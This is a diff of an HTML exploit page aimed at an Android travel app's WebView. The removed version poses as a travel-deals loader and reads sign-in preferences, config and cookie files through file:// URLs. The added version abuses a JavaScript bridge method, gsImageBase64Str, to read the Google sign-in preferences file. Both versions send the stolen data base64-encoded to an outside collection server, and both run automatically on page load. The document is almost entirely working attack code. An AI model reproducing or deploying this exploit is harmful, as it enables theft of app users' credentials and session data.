@@ -1,71 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Travel Deals</title>
-    <style>
-        body { background: #f0f2f5; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>Checking Itinerary...</title>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>Loading your personalized itinerary...</p>
-
     <script>
         const C2 = "https://evilios.free.beeceptor.com/exfil";
-        const FILES_TO_STEAL = [
-            "file:///data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml",
-            "file:///data/data/ctrip.english/shared_prefs/IBU_Config.xml",
-            "file:///data/data/ctrip.english/app_webview/Default/Cookies"
-        ];
+        const targetPath = "/data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
 
-        async function exfiltrate(url) {
-            try {
-                const response = await fetch(url);
-                const content = await response.text();
-                
-                // Send stolen content to C2
-                await fetch(C2, {
-                    method: "POST",
-                    mode: "no-cors",
-                    body: JSON.stringify({
-                        file: url,
-                        data: btoa(content), // Base64 to preserve XML/Binary formatting
-                        ts: Date.now()
-                    })
-                });
-            } catch (e) {
-                // Log failure to C2
-                new Image().src = C2 + "?error=" + btoa(url + " : " + e.message);
-            }
+        function log(msg) {
+            fetch(C2 + "?log=" + btoa(msg), {mode:'no-cors'});
         }
 
-        // Test the JS Bridge Gadget (TravelGuideH5Plugin)
-        function testBridgeGadget() {
-            if (window.Destination_a && window.Destination_a.gsImageBase64Str) {
-                // Attempt to read a file via the bridge's own logic
-                const path = "/data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
-                const b64Data = window.Destination_a.gsImageBase64Str(path);
-                if (b64Data) {
-                    fetch(C2, {
-                        method: "POST",
-                        mode: "no-cors",
-                        body: JSON.stringify({ method: "JS_BRIDGE_GADGET", path: path, data: b64Data })
-                    });
+        async function runExploit() {
+            log("Starting Bridge Exploit...");
+
+            // 1. Check for the Bridge Gadget
+            if (window.Destination_a && typeof window.Destination_a.gsImageBase64Str === 'function') {
+                try {
+                    // This bypasses SOP because the Java code reads the file, not the JS engine
+                    const stolenData = window.Destination_a.gsImageBase64Str(targetPath);
+                    
+                    if (stolenData) {
+                        log("Success: Data captured via Bridge");
+                        await fetch(C2, {
+                            method: "POST",
+                            mode: "no-cors",
+                            body: JSON.stringify({
+                                method: "JS_BRIDGE_BYPASS",
+                                file: targetPath,
+                                data: stolenData // This is already Base64 from the bridge
+                            })
+                        });
+                    } else {
+                        log("Bridge returned empty or null.");
+                    }
+                } catch (e) {
+                    log("Bridge Execution Error: " + e.message);
                 }
+            } else {
+                log("Destination_a.gsImageBase64Str not found.");
+                
+                // 2. Fallback: Try a Redirect to the file (Sometimes WebView allows rendering but not fetching)
+                log("Attempting direct location redirect fallback...");
+                window.location.href = "file://" + targetPath;
             }
         }
 
-        window.onload = async () => {
-            // 1. Exploit Universal Access to read files directly
-            for (const file of FILES_TO_STEAL) {
-                await exfiltrate(file);
-            }
-
-            // 2. Exploit JS Bridge if Universal Access is somehow patched but Bridge isn't
-            testBridgeGadget();
-        };
+        window.onload = runExploit;
     </script>
 </body>
 </html>
